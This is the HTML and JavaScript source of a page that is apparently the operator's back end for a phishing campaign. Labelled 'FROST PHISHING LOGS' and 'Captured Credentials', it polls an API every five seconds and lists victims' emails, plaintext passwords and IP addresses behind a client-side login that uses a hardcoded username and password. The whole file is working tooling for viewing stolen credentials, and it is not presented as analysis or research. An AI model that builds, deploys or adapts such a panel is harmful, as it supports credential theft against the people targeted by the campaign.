<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Frost Panel | Owner Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background: #0f0f0f; }
        .glass {
            background: rgba(15, 15, 15, 0.7);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(0, 255, 204, 0.2);
        }
        .glow-text {
            text-shadow: 0 0 8px rgba(0, 255, 204, 0.5);
        }
    </style>
</head>
<body class="text-gray-200">

    <div id="loginPage" class="min-h-screen flex items-center justify-center p-4">
        <div class="glass rounded-2xl p-8 w-full max-w-md border border-gray-800">
            <div class="text-center mb-8">
                <h1 class="text-3xl font-bold glow-text">🔐 FROST PANEL</h1>
                <p class="text-gray-400 text-sm mt-2">Owner Authentication Required</p>
            </div>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Username" class="w-full bg-black/50 border border-gray-700 rounded-lg px-4 py-3 mb-4 focus:outline-none focus:border-[#00ffcc] transition">
                <input type="password" id="password" placeholder="Password" class="w-full bg-black/50 border border-gray-700 rounded-lg px-4 py-3 mb-6 focus:outline-none focus:border-[#00ffcc] transition">
                <button type="submit" class="w-full bg-[#00ffcc] text-black font-bold py-3 rounded-lg hover:bg-[#00ddbb] transition duration-200">ACCESS PANEL</button>
            </form>
            <p class="text-xs text-center text-gray-500 mt-4">⚠️ Restricted Area • Frost Security</p>
        </div>
    </div>

    <div id="dashboardPage" class="hidden min-h-screen p-6">
        <div class="max-w-7xl mx-auto">
            <div class="flex justify-between items-center mb-8">
                <div>
                    <h1 class="text-3xl font-bold glow-text">📡 FROST PHISHING LOGS</h1>
                    <p class="text-gray-400 text-sm mt-1">FluxusZ Campaign • Captured Credentials</p>
                </div>
                <button id="logoutBtn" class="bg-red-600/30 hover:bg-red-600/50 px-4 py-2 rounded-lg border border-red-500/50 transition">Logout</button>
            </div>

            <div class="glass rounded-xl p-6 border border-gray-800">
                <h2 class="text-xl font-bold mb-4">📋 Login Attempts (All)</h2>
                <div class="overflow-x-auto">
                    <table class="w-full text-sm">
                        <thead class="border-b border-gray-700">
                            <tr class="text-left text-gray-400">
                                <th class="pb-3">Time</th>
                                <th class="pb-3">Email</th>
                                <th class="pb-3">Password</th>
                                <th class="pb-3">IP</th>
                            </tr>
                        </thead>
                        <tbody id="logsTable">
                            <tr><td colspan="4" class="text-center py-4">Loading...</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <script>
        const AUTH_KEY = "frost_owner_auth";
        const VALID_USER = "200714";
        const VALID_PASS = "200714";
        const API_LOGS_URL = '/api/getlogs';

        async function fetchLogs() {
            try {
                const res = await fetch(API_LOGS_URL);
                const data = await res.json();
                const tbody = document.getElementById('logsTable');
                
                if (data.logs && data.logs.length > 0) {
                    tbody.innerHTML = data.logs.map(log => `
                        <tr class="border-b border-gray-800 hover:bg-white/5">
                            <td class="py-3 text-xs">${new Date(log.timestamp).toLocaleString()}</td>
                            <td class="py-3 font-mono text-xs">${escapeHtml(log.email)}</td>
                            <td class="py-3 font-mono text-xs">${escapeHtml(log.password)}</td>
                            <td class="py-3 text-xs">${log.ip || '-'}</td>
                        </tr>
                    `).join('');
                } else {
                    tbody.innerHTML = '<tr><td colspan="4" class="text-center py-4">No data yet</td></tr>';
                }
            } catch (err) {
                document.getElementById('logsTable').innerHTML = '<tr><td colspan="4" class="text-center py-4 text-red-500">Error loading data</td></tr>';
            }
        }

        function escapeHtml(str) {
            if (!str) return '';
            return str.replace(/[&<>]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                return m;
            });
        }

        function checkAuth() {
            if (localStorage.getItem(AUTH_KEY) === "true") {
                document.getElementById("loginPage").classList.add("hidden");
                document.getElementById("dashboardPage").classList.remove("hidden");
                fetchLogs();
                setInterval(fetchLogs, 5000);
            }
        }

        document.getElementById("loginForm")?.addEventListener("submit", (e) => {
            e.preventDefault();
            const user = document.getElementById("username").value;
            const pass = document.getElementById("password").value;
            if (user === VALID_USER && pass === VALID_PASS) {
                localStorage.setItem(AUTH_KEY, "true");
                checkAuth();
            } else {
                alert("❌ Username atau password salah!");
            }
        });

        document.getElementById("logoutBtn")?.addEventListener("click", () => {
            localStorage.removeItem(AUTH_KEY);
            location.reload();
        });

        checkAuth();
    </script>
</body>
</html>
